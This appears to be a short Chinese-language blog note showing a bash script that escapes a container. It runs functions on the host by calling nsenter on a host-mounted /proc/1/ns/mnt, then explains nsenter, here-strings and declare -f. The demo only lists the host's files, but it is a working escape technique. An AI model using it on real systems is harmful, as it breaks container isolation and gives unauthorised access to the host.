---
title: 容器逃逸，用宿主机环境
date: 2025-07-16 16:50:59
tags:
  - 容器逃逸
categories:
  - shell
---

```bash
#!/bin/bash

my_func() {
    echo "当前运行环境：$(uname -a)"
    echo "当前路径：$(pwd)"
    echo "列出宿主机根目录："
    ls /
}

run_on_host() {
    nsenter --mount=/host/proc/1/ns/mnt bash <<<"$(declare -f my_func |  sed "\$a my_func")" # declare -f my_func —— 打印 my_func 函数定义。sed '$a my_func' —— 在函数定义最后一行追加一行 my_func，用于自动执行
}

run_on_host
```

nsenter 是 Linux 下的一个命令，可以进入其他进程的命名空间（namespace），比如：

- --mount 表示进入挂载命名空间（即文件系统环境）

- --pid 表示进入进程空间

- --net 表示进入网络空间

等等……

这意味着你可以“变成另一个进程看到的世界”。

- /host/proc/1/ns/mnt 是宿主机中 1 号进程的挂载命名空间文件

- 容器内的 /proc/1/ns/mnt 是容器的命名空间

- 通常容器里会把宿主机的 /proc 挂载到 /host/proc 下

- 1 号进程 在宿主机上就是 init 进程，也就是整个系统的根命名空间

### bash <<<"..." 是什么意思？

```bsah
bash <<<"..."
==
echo "..." | bash
```

### declare -f

表示把函数定义输出出来：

```bash
declare -f func1 func2 ...
```

```bash
my_func() {
  echo "hello"
}
declare -f my_func
```

输出:

```bash
my_func() {
  echo "hello"
}
```

> sed "\$a \_\_main"

```bash
sed "\$a __main"
==
sed '$a __main'
```

在最后加上一行 **main，表示自动调用 **main 函数
